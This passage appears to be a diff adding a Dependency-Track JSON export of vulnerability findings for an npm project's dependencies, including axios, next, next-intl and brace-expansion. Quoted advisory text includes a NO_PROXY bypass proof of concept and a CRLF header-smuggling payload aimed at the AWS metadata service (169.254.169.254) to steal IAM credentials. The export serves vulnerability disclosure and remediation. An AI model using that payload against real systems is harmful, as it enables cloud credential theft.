@@ -1,0 +1,1062 @@
+{
+    "meta": {
+        "baseUrl": "http://dtrack.example.org",
+        "application": "Dependency-Track",
+        "version": "4.14.1",
+        "timestamp": "2026-04-24T19:39:49Z"
+    },
+    "findings": [
+        {
+            "component": {
+                "name": "brace-expansion",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/brace-expansion@2.0.3",
+                "uuid": "15771e87-9e7f-4931-a704-315662572101",
+                "version": "2.0.3",
+                "latestVersion": "5.0.5"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-07 23:55:09.748"
+            },
+            "vulnerability": {
+                "severity": "CRITICAL",
+                "vulnId": "CVE-2026-25547",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-7h2j-956f-4vf2",
+                        "cveId": "CVE-2026-25547"
+                    }
+                ],
+                "references": "* [https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2](https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2)",
+                "cvssV4Score": 9.2,
+                "cweId": 1333,
+                "description": "@isaacs/brace-expansion is a hybrid CJS/ESM TypeScript fork of brace-expansion. Prior to version 5.0.1, @isaacs/brace-expansion is vulnerable to a denial of service (DoS) issue caused by unbounded brace range expansion. When an attacker provides a pattern containing repeated numeric brace ranges, the library attempts to eagerly generate every possible combination synchronously. Because the expansion grows exponentially, even a small input can consume excessive CPU and memory and may crash the Node.js process. This issue has been patched in version 5.0.1.",
+                "epssScore": 0.0002,
+                "source": "NVD",
+                "published": "2026-02-04 22:16:00.813",
+                "cwes": [
+                    {
+                        "cweId": 1333,
+                        "name": "Inefficient Regular Expression Complexity"
+                    }
+                ],
+                "uuid": "07997273-7f39-4b42-8785-0b24fcad85cb",
+                "severityRank": 0,
+                "cweName": "Inefficient Regular Expression Complexity",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "epssPercentile": 0.05566
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:15771e87-9e7f-4931-a704-315662572101:07997273-7f39-4b42-8785-0b24fcad85cb",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "brace-expansion",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/brace-expansion@1.1.13",
+                "uuid": "21eba8f2-7ac0-445f-a834-bfee3f27b77c",
+                "version": "1.1.13",
+                "latestVersion": "5.0.5"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-07 23:55:12.577"
+            },
+            "vulnerability": {
+                "severity": "CRITICAL",
+                "vulnId": "CVE-2026-25547",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-7h2j-956f-4vf2",
+                        "cveId": "CVE-2026-25547"
+                    }
+                ],
+                "references": "* [https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2](https://github.com/isaacs/brace-expansion/security/advisories/GHSA-7h2j-956f-4vf2)",
+                "cvssV4Score": 9.2,
+                "cweId": 1333,
+                "description": "@isaacs/brace-expansion is a hybrid CJS/ESM TypeScript fork of brace-expansion. Prior to version 5.0.1, @isaacs/brace-expansion is vulnerable to a denial of service (DoS) issue caused by unbounded brace range expansion. When an attacker provides a pattern containing repeated numeric brace ranges, the library attempts to eagerly generate every possible combination synchronously. Because the expansion grows exponentially, even a small input can consume excessive CPU and memory and may crash the Node.js process. This issue has been patched in version 5.0.1.",
+                "epssScore": 0.0002,
+                "source": "NVD",
+                "published": "2026-02-04 22:16:00.813",
+                "cwes": [
+                    {
+                        "cweId": 1333,
+                        "name": "Inefficient Regular Expression Complexity"
+                    }
+                ],
+                "uuid": "07997273-7f39-4b42-8785-0b24fcad85cb",
+                "severityRank": 0,
+                "cweName": "Inefficient Regular Expression Complexity",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "epssPercentile": 0.05566
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:21eba8f2-7ac0-445f-a834-bfee3f27b77c:07997273-7f39-4b42-8785-0b24fcad85cb",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "axios",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/axios@1.13.6",
+                "uuid": "4589322c-61b1-49bf-b38f-9a92cf588681",
+                "version": "1.13.6",
+                "latestVersion": "1.15.2"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-09 23:55:24.846"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 4.8,
+                "vulnId": "GHSA-3p68-rc4w-qgx5",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-3p68-rc4w-qgx5",
+                        "cveId": "CVE-2025-62718"
+                    }
+                ],
+                "references": "* [https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5](https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5)\n* [https://nvd.nist.gov/vuln/detail/CVE-2025-62718](https://nvd.nist.gov/vuln/detail/CVE-2025-62718)\n* [https://github.com/axios/axios/pull/10661](https://github.com/axios/axios/pull/10661)\n* [https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df](https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df)\n* [https://datatracker.ietf.org/doc/html/rfc1034#section-3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1)\n* [https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2)\n* [https://github.com/axios/axios/releases/tag/v1.15.0](https://github.com/axios/axios/releases/tag/v1.15.0)\n* [https://github.com/axios/axios/pull/10688](https://github.com/axios/axios/pull/10688)\n* [https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c](https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c)\n* [https://github.com/axios/axios/releases/tag/v0.31.0](https://github.com/axios/axios/releases/tag/v0.31.0)\n* [https://github.com/advisories/GHSA-3p68-rc4w-qgx5](https://github.com/advisories/GHSA-3p68-rc4w-qgx5)",
+                "cvssV4Score": 6.3,
+                "cweId": 441,
+                "description": "Axios does not correctly handle hostname normalization when checking `NO_PROXY` rules.\nRequests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip `NO_PROXY` matching and go through the configured proxy.\n\nThis goes against what developers expect and lets attackers force requests through a proxy, even if `NO_PROXY` is set up to protect loopback or internal services.\n\nAccording to [RFC 1034 §3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1) and [RFC 3986 §3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2), a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, `localhost.` is the same as `localhost`. \nHowever, Axios does a literal string comparison instead of normalizing hostnames before checking `NO_PROXY`. This causes requests like `http://localhost.:8080/` and `http://[::1]:8080/` to be incorrectly proxied.\n\nThis issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.\n\n---\n\n**PoC**\n\n```js\nimport http from \"http\";\nimport axios from \"axios\";\n\nconst proxyPort = 5300;\n\nhttp.createServer((req, res) => {\n  console.log(\"[PROXY] Got:\", req.method, req.url, \"Host:\", req.headers.host);\n  res.writeHead(200, { \"Content-Type\": \"text/plain\" });\n  res.end(\"proxied\");\n}).listen(proxyPort, () => console.log(\"Proxy\", proxyPort));\n\nprocess.env.HTTP_PROXY = `http://127.0.0.1:${proxyPort}`;\nprocess.env.NO_PROXY = \"localhost,127.0.0.1,::1\";\n\nasync function test(url) {\n  try {\n    await axios.get(url, { timeout: 2000 });\n  } catch {}\n}\n\nsetTimeout(async () => {\n  console.log(\"\\n[*] Testing http://localhost.:8080/\");\n  await test(\"http://localhost.:8080/\"); // goes through proxy\n\n  console.log(\"\\n[*] Testing http://[::1]:8080/\");\n  await test(\"http://[::1]:8080/\"); // goes through proxy\n}, 500);\n```\n\n**Expected:** Requests bypass the proxy (direct to loopback).\n**Actual:** Proxy logs requests for `localhost.` and `[::1]`.\n\n---\n\n**Impact**\n\n* Applications that rely on `NO_PROXY=localhost,127.0.0.1,::1` for protecting loopback/internal access are vulnerable.\n* Attackers controlling request URLs can:\n\n  * Force Axios to send local traffic through an attacker-controlled proxy.\n  * Bypass SSRF mitigations relying on NO\\_PROXY rules.\n  * Potentially exfiltrate sensitive responses from internal services via the proxy.\n  \n  \n---\n\n**Affected Versions**\n\n* Confirmed on Axios **1.12.2** (latest at time of testing).\n* affects all versions that rely on Axios\u2019 current `NO_PROXY` evaluation.\n\n---\n\n**Remediation**\nAxios should normalize hostnames before evaluating `NO_PROXY`, including:\n\n* Strip trailing dots from hostnames (per RFC 3986).\n* Normalize IPv6 literals by removing brackets for matching.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "epssScore": 0.00034,
+                "source": "GITHUB",
+                "published": "2026-04-09 17:32:19.0",
+                "title": "Axios has a NO_PROXY Hostname Normalization Bypass that Leads to SSRF",
+                "cwes": [
+                    {
+                        "cweId": 441,
+                        "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
+                    },
+                    {
+                        "cweId": 918,
+                        "name": "Server-Side Request Forgery (SSRF)"
+                    }
+                ],
+                "uuid": "2e7ae170-4d94-43c4-bb2b-b7baf24c2148",
+                "severityRank": 2,
+                "cweName": "Unintended Proxy or Intermediary ('Confused Deputy')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+                "epssPercentile": 0.09709
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:4589322c-61b1-49bf-b38f-9a92cf588681:2e7ae170-4d94-43c4-bb2b-b7baf24c2148",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "axios",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/axios@1.13.6",
+                "uuid": "4589322c-61b1-49bf-b38f-9a92cf588681",
+                "version": "1.13.6",
+                "latestVersion": "1.15.2"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-10 12:06:59.235"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 9.9,
+                "vulnId": "CVE-2025-62718",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-3p68-rc4w-qgx5",
+                        "cveId": "CVE-2025-62718"
+                    }
+                ],
+                "references": "* [https://datatracker.ietf.org/doc/html/rfc1034#section-3.1](https://datatracker.ietf.org/doc/html/rfc1034#section-3.1)\n* [https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2)\n* [https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c](https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c)\n* [https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df](https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df)\n* [https://github.com/axios/axios/pull/10661](https://github.com/axios/axios/pull/10661)\n* [https://github.com/axios/axios/pull/10688](https://github.com/axios/axios/pull/10688)\n* [https://github.com/axios/axios/releases/tag/v0.31.0](https://github.com/axios/axios/releases/tag/v0.31.0)\n* [https://github.com/axios/axios/releases/tag/v1.15.0](https://github.com/axios/axios/releases/tag/v1.15.0)\n* [https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5](https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5)",
+                "cvssV4Score": 6.3,
+                "cweId": 441,
+                "description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L",
+                "epssScore": 0.00035,
+                "source": "NVD",
+                "published": "2026-04-09 15:16:08.65",
+                "cwes": [
+                    {
+                        "cweId": 441,
+                        "name": "Unintended Proxy or Intermediary ('Confused Deputy')"
+                    },
+                    {
+                        "cweId": 918,
+                        "name": "Server-Side Request Forgery (SSRF)"
+                    }
+                ],
+                "uuid": "7a287e6d-2df0-47a7-974d-81d49e533223",
+                "severityRank": 2,
+                "cweName": "Unintended Proxy or Intermediary ('Confused Deputy')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+                "epssPercentile": 0.10437
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:4589322c-61b1-49bf-b38f-9a92cf588681:7a287e6d-2df0-47a7-974d-81d49e533223",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "next",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/next@16.2.1",
+                "uuid": "06396b4a-576c-43b0-bb8d-62f4f07c0be5",
+                "version": "16.2.1",
+                "latestVersion": "16.2.4"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-10 23:55:15.494"
+            },
+            "vulnerability": {
+                "severity": "HIGH",
+                "cvssV3BaseScore": 7.5,
+                "vulnId": "GHSA-q4gf-8mx6-v5v3",
+                "aliases": [],
+                "references": "* [https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3](https://github.com/vercel/next.js/security/advisories/GHSA-q4gf-8mx6-v5v3)\n* [https://vercel.com/changelog/summary-of-cve-2026-23869](https://vercel.com/changelog/summary-of-cve-2026-23869)\n* [https://github.com/advisories/GHSA-q4gf-8mx6-v5v3](https://github.com/advisories/GHSA-q4gf-8mx6-v5v3)",
+                "cweId": 770,
+                "description": "A vulnerability affects certain React Server Components packages for versions 19.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23869](https://github.com/facebook/react/security/advisories/GHSA-479c-33wc-g2pg). You can read more about this advisory our [this changelog](https://vercel.com/changelog/summary-of-cve-2026-23869).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage. This can result in denial of service in unpatched environments.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "source": "GITHUB",
+                "published": "2026-04-10 15:35:47.0",
+                "title": "Next.js has a Denial of Service with Server Components",
+                "cwes": [
+                    {
+                        "cweId": 770,
+                        "name": "Allocation of Resources Without Limits or Throttling"
+                    }
+                ],
+                "uuid": "37113a35-749a-461e-97bd-1c509feb4814",
+                "severityRank": 1,
+                "cweName": "Allocation of Resources Without Limits or Throttling"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:06396b4a-576c-43b0-bb8d-62f4f07c0be5:37113a35-749a-461e-97bd-1c509feb4814",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "axios",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/axios@1.13.6",
+                "uuid": "4589322c-61b1-49bf-b38f-9a92cf588681",
+                "version": "1.13.6",
+                "latestVersion": "1.15.2"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-10 23:55:16.727"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 4.8,
+                "vulnId": "GHSA-fvcv-3m26-pcqx",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-fvcv-3m26-pcqx",
+                        "cveId": "CVE-2026-40175"
+                    }
+                ],
+                "references": "* [https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx](https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx)\n* [https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1](https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1)\n* [https://github.com/axios/axios/releases/tag/v1.15.0](https://github.com/axios/axios/releases/tag/v1.15.0)\n* [https://nvd.nist.gov/vuln/detail/CVE-2026-40175](https://nvd.nist.gov/vuln/detail/CVE-2026-40175)\n* [https://github.com/axios/axios/pull/10660](https://github.com/axios/axios/pull/10660)\n* [https://github.com/axios/axios/pull/10660#issuecomment-4224168081](https://github.com/axios/axios/pull/10660#issuecomment-4224168081)\n* [https://github.com/axios/axios/pull/10688](https://github.com/axios/axios/pull/10688)\n* [https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c](https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c)\n* [https://github.com/axios/axios/releases/tag/v0.31.0](https://github.com/axios/axios/releases/tag/v0.31.0)\n* [https://github.com/advisories/GHSA-fvcv-3m26-pcqx](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)",
+                "cweId": 113,
+                "description": "# Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\nThe Axios library is vulnerable to a specific \"Gadget\" attack chain that allows **Prototype Pollution** in any third-party dependency to be escalated into **Remote Code Execution (RCE)** or **Full Cloud Compromise** (via AWS IMDSv2 bypass).\n\nWhile Axios patches exist for *preventing check* pollution, the library remains vulnerable to *being used* as a gadget when pollution occurs elsewhere. This is due to a lack of HTTP Header Sanitization (CWE-113) combined with default SSRF capabilities.\n\n**Severity**: Critical (CVSS 9.9)\n**Affected Versions**: All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)\n\n## Usage of \"Helper\" Vulnerabilities\nThis vulnerability is unique because it requires **Zero Direct User Input**.\nIf an attacker can pollute `Object.prototype` via *any* other library in the stack (e.g., `qs`, `minimist`, `ini`, `body-parser`), Axios will automatically pick up the polluted properties during its config merge.\n\nBecause Axios does not sanitise these merged header values for CRLF (`\\r\\n`) characters, the polluted property becomes a **Request Smuggling** payload.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated Pollution)\nImagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:\n```javascript\nObject.prototype['x-amz-target'] = \"dummy\\r\\n\\r\\nPUT /latest/api/token HTTP/1.1\\r\\nHost: 169.254.169.254\\r\\nX-aws-ec2-metadata-token-ttl-seconds: 21600\\r\\n\\r\\nGET /ignore\";\n```\n\n### 2. The Gadget Trigger (Safe Code)\nThe application makes a completely safe, hardcoded request:\n```javascript\n// This looks safe to the developer\nawait axios.get('https://analytics.internal/pings'); \n```\n\n### 3. The Execution\nAxios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.\n\n**Resulting HTTP traffic:**\n```http\nGET /pings HTTP/1.1\nHost: analytics.internal\nx-amz-target: dummy\n\nPUT /latest/api/token HTTP/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET /ignore HTTP/1.1\n...\n```\n\n### 4. The Impact (IMDSv2 Bypass)\nThe \"Smuggled\" second request is a valid `PUT` request to the AWS Metadata Service. It includes the required `X-aws-ec2-metadata-token-ttl-seconds` header (which a normal SSRF cannot send).\nThe Metadata Service returns a session token, allowing the attacker to steal IAM credentials and compromise the cloud account.\n\n## Impact Analysis\n-   **Security Control Bypass**: Defeats AWS IMDSv2 (Session Tokens).\n-   **Authentication Bypass**: Can inject headers (`Cookie`, `Authorization`) to pivot into internal administrative panels.\n-   **Cache Poisoning**: Can inject `Host` headers to poison shared caches.\n\n## Recommended Fix\nValidate all header values in `lib/adapters/http.js` and `xhr.js` before passing them to the underlying request function.\n\n**Patch Suggestion:**\n```javascript\n// In lib/adapters/http.js\nutils.forEach(requestHeaders, function setRequestHeader(val, key) {\n  if (/[\\r\\n]/.test(val)) {\n    throw new Error('Security: Header value contains invalid characters');\n  }\n  // ... proceed to set header\n});\n```\n\n## References\n-   **OWASP**: CRLF Injection (CWE-113)\n\nThis report was generated as part of a security audit of the Axios library.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "epssScore": 0.00403,
+                "source": "GITHUB",
+                "published": "2026-04-10 19:47:16.0",
+                "title": "Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain",
+                "cwes": [
+                    {
+                        "cweId": 113,
+                        "name": "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')"
+                    },
+                    {
+                        "cweId": 444,
+                        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+                    },
+                    {
+                        "cweId": 918,
+                        "name": "Server-Side Request Forgery (SSRF)"
+                    }
+                ],
+                "uuid": "4186850a-7d0b-4f16-8e09-6fed5fea5264",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')",
+                "epssPercentile": 0.60949
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:4589322c-61b1-49bf-b38f-9a92cf588681:4186850a-7d0b-4f16-8e09-6fed5fea5264",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "next-intl",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/next-intl@4.8.3",
+                "uuid": "1a0ff72f-8ce5-4d27-ba9e-89e4e8ee11ba",
+                "version": "4.8.3",
+                "latestVersion": "4.9.1"
+            },
+            "attribution": {
+                "analyzerIdentity": "INTERNAL_ANALYZER",
+                "attributedOn": "2026-04-10 23:55:18.598"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "GHSA-8f24-v5vv-gm5j",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-8f24-v5vv-gm5j",
+                        "cveId": "CVE-2026-40299"
+                    }
+                ],
+                "references": "* [https://github.com/amannn/next-intl/security/advisories/GHSA-8f24-v5vv-gm5j](https://github.com/amannn/next-intl/security/advisories/GHSA-8f24-v5vv-gm5j)\n* [https://github.com/amannn/next-intl/pull/2304](https://github.com/amannn/next-intl/pull/2304)\n* [https://github.com/amannn/next-intl/commit/1c80b668aa6d853f470319eec10a3f61e78a70e6](https://github.com/amannn/next-intl/commit/1c80b668aa6d853f470319eec10a3f61e78a70e6)\n* [https://github.com/amannn/next-intl/releases/tag/v4.9.1](https://github.com/amannn/next-intl/releases/tag/v4.9.1)\n* [https://github.com/advisories/GHSA-8f24-v5vv-gm5j](https://github.com/advisories/GHSA-8f24-v5vv-gm5j)",
+                "cvssV4Score": 6.9,
+                "cweId": 601,
+                "description": "### Impact\n\nApplications using the `next-intl` middleware with `localePrefix: 'as-needed'` could construct URLs where path handling and the WHATWG URL parser resolved a relative redirect target to another host (e.g. scheme-relative `//` or control characters stripped by the URL parser), so the middleware could redirect the browser off-site while the user still started from a trusted app URL.\n\n### Patches\n\nThe problem has been patched, please update to [`next-intl@4.9.1`](https://github.com/amannn/next-intl/releases/tag/v4.9.1).\n\n### Credits\n\nMany thanks to [Joni Liljeblad](https://github.com/joniumGit) from [Oura](https://ouraring.com) for responsibly disclosing the vulnerability and for suggesting the fix.",
+                "source": "GITHUB",
+                "published": "2026-04-10 21:03:55.0",
+                "title": "next-intl has an open redirect vulnerability",
+                "cwes": [
+                    {
+                        "cweId": 601,
+                        "name": "URL Redirection to Untrusted Site ('Open Redirect')"
+                    }
+                ],
+                "uuid": "745542e0-0dc8-477a-a38e-5e60c8ff6613",
+                "severityRank": 2,
+                "cweName": "URL Redirection to Untrusted Site ('Open Redirect')",
+                "cvssV4Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:1a0ff72f-8ce5-4d27-ba9e-89e4e8ee11ba:745542e0-0dc8-477a-a38e-5e60c8ff6613",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "axios",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/axios@1.13.6",
+                "uuid": "4589322c-61b1-49bf-b38f-9a92cf588681",
+                "version": "1.13.6",
+                "latestVersion": "1.15.2"
+            },
+            "attribution": {
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-11 23:55:03.875"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "cvssV3BaseScore": 4.8,
+                "vulnId": "CVE-2026-40175",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-fvcv-3m26-pcqx",
+                        "cveId": "CVE-2026-40175"
+                    }
+                ],
+                "references": "* [https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c](https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c)\n* [https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1](https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1)\n* [https://github.com/axios/axios/pull/10660](https://github.com/axios/axios/pull/10660)\n* [https://github.com/axios/axios/pull/10660#issuecomment-4224168081](https://github.com/axios/axios/pull/10660#issuecomment-4224168081)\n* [https://github.com/axios/axios/pull/10688](https://github.com/axios/axios/pull/10688)\n* [https://github.com/axios/axios/releases/tag/v0.31.0](https://github.com/axios/axios/releases/tag/v0.31.0)\n* [https://github.com/axios/axios/releases/tag/v1.15.0](https://github.com/axios/axios/releases/tag/v1.15.0)\n* [https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx](https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx)",
+                "cweId": 113,
+                "description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.3.1, the Axios library is vulnerable to a specific \"Gadget\" attack chain that allows Prototype Pollution in any third-party dependency to be escalated into Remote Code Execution (RCE) or Full Cloud Compromise (via AWS IMDSv2 bypass). This vulnerability is fixed in 1.15.0 and 0.3.1.",
+                "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+                "epssScore": 0.00028,
+                "source": "NVD",
+                "published": "2026-04-10 20:16:22.8",
+                "cwes": [
+                    {
+                        "cweId": 113,
+                        "name": "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')"
+                    },
+                    {
+                        "cweId": 444,
+                        "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+                    },
+                    {
+                        "cweId": 918,
+                        "name": "Server-Side Request Forgery (SSRF)"
+                    }
+                ],
+                "uuid": "c2a1d8da-f348-4121-b7fb-9760f74ef851",
+                "severityRank": 2,
+                "cweName": "Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')",
+                "epssPercentile": 0.07911
+            },
+            "matrix": "ca4f2da9-0fad-4a13-92d7-f627f3168a56:4589322c-61b1-49bf-b38f-9a92cf588681:c2a1d8da-f348-4121-b7fb-9760f74ef851",
+            "analysis": {
+                "isSuppressed": false
+            }
+        },
+        {
+            "component": {
+                "name": "next-intl",
+                "project": "ca4f2da9-0fad-4a13-92d7-f627f3168a56",
+                "purl": "pkg:npm/next-intl@4.8.3",
+                "uuid": "1a0ff72f-8ce5-4d27-ba9e-89e4e8ee11ba",
+                "version": "4.8.3",
+                "latestVersion": "4.9.1"
+            },
+            "attribution": {
+                "alternateIdentifier": "CVE-2026-40299",
+                "analyzerIdentity": "OSSINDEX_ANALYZER",
+                "attributedOn": "2026-04-13 23:55:45.326",
+                "referenceUrl": "https://ossindex.sonatype.org/vulnerability/CVE-2026-40299?component-type=npm&component-name=next-intl&utm_source=dependency-track&utm_medium=integration&utm_content=v4.14.0"
+            },
+            "vulnerability": {
+                "severity": "MEDIUM",
+                "vulnId": "CVE-2026-40299",
+                "aliases": [
+                    {
+                        "ghsaId": "GHSA-8f24-v5vv-gm5j",
+                        "cveId": "CVE-2026-40299"
+                    }
+                ],
